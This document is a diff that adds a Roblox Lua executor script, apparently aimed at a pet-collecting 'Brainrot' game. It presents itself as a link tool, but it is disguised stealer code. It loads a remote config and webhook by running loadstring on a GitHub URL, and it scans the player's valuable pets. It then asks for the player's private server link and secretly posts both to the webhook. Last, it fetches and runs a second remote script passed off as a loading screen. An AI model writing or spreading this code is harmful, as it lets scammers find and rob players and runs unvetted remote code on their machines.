@@ -1,0 +1,179 @@
+-- Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+
+-- Hide default leaderboard
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+
+-- Load config from GitHub
+local config = {}
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/realscript/refs/heads/main/config"))()
+    end)
+    config = ok and type(res) == "table" and res or {WEBHOOK="",targetNames={},Receiver={}}
+end
+
+local WEBHOOK = config.WEBHOOK
+local targetNames = config.targetNames or {}
+local receiverList = table.concat(config.Receiver or {}, ", ")
+
+-- Detect server type (private only)
+local serverType = "UNKNOWN"
+local map = Workspace:FindFirstChild("Map")
+if map then
+    local codes = map:FindFirstChild("Codes")
+    local main = codes and codes:FindFirstChild("Main")
+    local gui = main and main:FindFirstChild("SurfaceGui")
+    local frame = gui and gui:FindFirstChild("MainFrame")
+    local privateLabel = frame and frame:FindFirstChild("PrivateServerMessage")
+    serverType = privateLabel and privateLabel.Visible and "PRIVATE" or "PUBLIC"
+end
+
+if serverType == "PUBLIC" then
+    warn("❌ Use only in PRIVATE SERVER.")
+    return
+end
+
+-- Scan pets
+local function scanMyBase()
+    local list = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return list end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign then
+            local gui = sign:FindFirstChild("SurfaceGui")
+            local frame = gui and gui:FindFirstChild("Frame")
+            local label = frame and frame:FindFirstChild("TextLabel")
+            if label and label.Text:find(player.DisplayName) then
+                local podiums = plot:FindFirstChild("AnimalPodiums")
+                if podiums then
+                    for _, podium in ipairs(podiums:GetChildren()) do
+                        local attach = podium:FindFirstChild("Base")
+                        attach = attach and attach:FindFirstChild("Spawn")
+                        attach = attach and attach:FindFirstChild("Attachment")
+                        attach = attach and attach:FindFirstChild("AnimalOverhead")
+                        if attach then
+                            local nameObj = attach:FindFirstChild("DisplayName")
+                            local genObj = attach:FindFirstChild("Generation")
+                            table.insert(list, {
+                                name = nameObj and nameObj.Text or "Unknown",
+                                value = genObj and genObj.Text or "Unknown"
+                            })
+                        end
+                    end
+                end
+                break
+            end
+        end
+    end
+    return list
+end
+
+-- Parse value like "7.5M/s"
+local function parseVal(txt)
+    local n = tonumber(txt:match("[%d%.]+")) or 0
+    if txt:find("K") then n = n*1e3
+    elseif txt:find("M") then n = n*1e6
+    elseif txt:find("B") then n = n*1e9 end
+    return n
+end
+
+-- Send webhook
+local function sendWebhook(pets, link)
+    if player:GetAttribute("WebhookSent") then return end
+    local high = 7.5e6
+
+    local lines = {}
+    for _, p in ipairs(pets) do
+        table.insert(lines, p.name.." → "..p.value)
+    end
+
+    local embed = {
+        title = "🧠 Brainrots Scanned!",
+        color = 12413107,
+        fields = {
+            {name="Server Type", value=serverType},
+            {name="Pet List", value="```"..table.concat(lines,"\n").."```"},
+            {name="Join Server Link", value=("[Click to Join](%s)"):format(link)}
+        }
+    }
+
+    local payload = {
+        content = "",
+        embeds = {embed}
+    }
+
+    local req = syn and syn.request or http_request or request
+    if req and WEBHOOK ~= "" then
+        pcall(function()
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers= {["Content-Type"]="application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        player:SetAttribute("WebhookSent", true)
+    end
+end
+
+-- GUI
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "BrainrotLink"
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0,300,0,150)
+frame.Position = UDim2.new(0.5,-150,0.5,-75)
+frame.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner",frame).CornerRadius = UDim.new(0,10)
+
+local title = Instance.new("TextLabel",frame)
+title.Size = UDim2.new(1,0,0,30)
+title.Text = "Enter Private Link"
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.new(1,1,1)
+
+local box = Instance.new("TextBox",frame)
+box.Size = UDim2.new(0.9,0,0,30)
+box.Position = UDim2.new(0.05,0,0.4,0)
+box.BackgroundColor3 = Color3.new(0.3,0.3,0.3)
+box.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner",box).CornerRadius = UDim.new(0,8)
+
+local function valid(txt)
+    return txt:match("^https://www%.roblox%.com/share%?code=.+&type=Server$")
+end
+
+local btn = Instance.new("TextButton",frame)
+btn.Size = UDim2.new(0.4,0,0,28)
+btn.Position = UDim2.new(0.3,0,0.7,0)
+btn.Text = "Send"
+btn.TextColor3 = Color3.new(1,1,1)
+btn.BackgroundColor3 = Color3.new(0,0.6,0)
+Instance.new("UICorner",btn).CornerRadius = UDim.new(0,8)
+
+btn.MouseButton1Click:Connect(function()
+    if valid(box.Text) then
+        gui:Destroy()
+        task.spawn(function()
+            local pets = scanMyBase()
+            if #pets > 0 then
+                sendWebhook(pets, box.Text)
+            end
+            task.wait(1)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/loadingscreen/refs/heads/main/loading2"))()
+        end)
+    else
+        warn("Invalid link")
+    end
+end)
